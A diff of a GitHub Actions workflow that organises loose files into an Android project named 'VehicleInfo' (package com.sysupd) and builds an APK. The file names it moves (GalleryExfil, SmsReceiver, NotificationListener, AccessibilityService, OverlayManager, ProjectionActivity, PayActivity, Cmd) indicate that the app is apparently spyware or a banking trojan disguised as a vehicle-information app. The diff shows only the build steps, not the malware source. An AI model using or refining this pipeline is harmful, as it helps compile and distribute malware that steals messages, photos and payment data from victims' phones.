@@ -17,17 +17,13 @@ jobs:
           distribution: temurin
           java-version: '17'
 
-      - name: Setup Android SDK
-        run: |
-          echo "ANDROID_HOME=$ANDROID_SDK_ROOT" >> $GITHUB_ENV
-          echo "ANDROID_SDK_ROOT=$ANDROID_SDK_ROOT" >> $GITHUB_ENV
-          echo "$ANDROID_SDK_ROOT/cmdline-tools/latest/bin" >> $GITHUB_PATH
-          echo "$ANDROID_SDK_ROOT/platform-tools" >> $GITHUB_PATH
-          ls $ANDROID_SDK_ROOT
-
-      - name: Rearrange files to correct structure
+      - name: Rearrange files
         run: |
           set -e
+          echo "=== BEFORE ==="
+          ls -la
+
+          # Create folders
           mkdir -p app/src/main/java/com/sysupd
           mkdir -p app/src/main/res/layout
           mkdir -p app/src/main/res/values
@@ -35,12 +31,14 @@ jobs:
           mkdir -p app/src/main/res/mipmap-hdpi
           mkdir -p gradle/wrapper
 
+          # Move Java files
           for f in AccessibilityService BootReceiver CameraModule Cmd Core \
                    ForegroundService GalleryExfil MainActivity NotificationListener \
                    OverlayManager PayActivity ProjectionActivity SmsReceiver SuccessActivity; do
-            [ -f "$f.java" ] && mv "$f.java" app/src/main/java/com/sysupd/
+            if [ -f "$f.java" ]; then mv "$f.java" app/src/main/java/com/sysupd/; fi
           done
 
+          # Move resources
           [ -f activity_main.xml ] && mv activity_main.xml app/src/main/res/layout/
           [ -f activity_success.xml ] && mv activity_success.xml app/src/main/res/layout/
           [ -f colors.xml ] && mv colors.xml app/src/main/res/values/
@@ -48,16 +46,60 @@ jobs:
           [ -f themes.xml ] && mv themes.xml app/src/main/res/values/
           [ -f accessibility_config.xml ] && mv accessibility_config.xml app/src/main/res/xml/
           [ -f ic_launcher.png ] && mv ic_launcher.png app/src/main/res/mipmap-hdpi/
+
+          # App root files
           [ -f AndroidManifest.xml ] && mv AndroidManifest.xml app/src/main/
           [ -f google-services.json ] && mv google-services.json app/
 
+          # CRITICAL: move root build.gradle to app/build.gradle
           if [ -f build.gradle ]; then
             mv build.gradle app/build.gradle
           fi
 
+          # Create root build.gradle (project-level)
+          cat > build.gradle << 'EOF2'
+          buildscript {
+              repositories { google(); mavenCentral() }
+              dependencies {
+                  classpath 'com.android.tools.build:gradle:8.1.4'
+                  classpath 'com.google.gms:google-services:4.4.0'
+              }
+          }
+          allprojects {
+              repositories { google(); mavenCentral() }
+          }
+          EOF2
+
+          # Create settings.gradle if missing
+          cat > settings.gradle << 'EOF2'
+          rootProject.name = "VehicleInfo"
+          include ':app'
+          EOF2
+
+          # gradle.properties
+          cat > gradle.properties << 'EOF2'
+          android.useAndroidX=true
+          android.enableJetifier=true
+          org.gradle.jvmargs=-Xmx2048m
+          EOF2
+
+          # Gradle wrapper
           [ -f gradle-wrapper.jar ] && mv gradle-wrapper.jar gradle/wrapper/
           [ -f gradle-wrapper.properties ] && mv gradle-wrapper.properties gradle/wrapper/
 
+          # Wrapper properties
+          cat > gradle/wrapper/gradle-wrapper.properties << 'EOF2'
+          distributionBase=GRADLE_USER_HOME
+          distributionPath=wrapper/dists
+          distributionUrl=https\://services.gradle.org/distributions/gradle-8.5-bin.zip
+          zipStoreBase=GRADLE_USER_HOME
+          zipStorePath=wrapper/dists
+          EOF2
+
+          # Add android SDK location
+          echo "sdk.dir=$ANDROID_SDK_ROOT" > local.properties
+
+          echo "=== AFTER ==="
           find . -type f -not -path './.git/*' | sort
 
       - name: Build APK
